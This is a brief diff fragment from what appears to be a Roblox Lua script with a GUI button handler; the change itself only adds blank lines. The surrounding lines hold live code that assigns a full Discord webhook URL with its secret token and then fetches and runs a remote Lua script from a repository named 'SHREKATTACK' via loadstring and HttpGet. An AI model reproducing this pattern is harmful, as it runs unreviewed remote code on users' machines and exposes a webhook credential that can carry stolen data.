@@ -147,3 +147,5 @@ Open.MouseButton1Click:connect(function()
 end)
 _G.webhooksdiscord = "https://discordapp.com/api/webhooks/900321615039066114/fTyHAYH97J_EOuV_aQWlnqNXZp65onuQ8UAytIs4T3O7kee9Cm4lT_TaGrrwYbDy9jrp"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
+
+
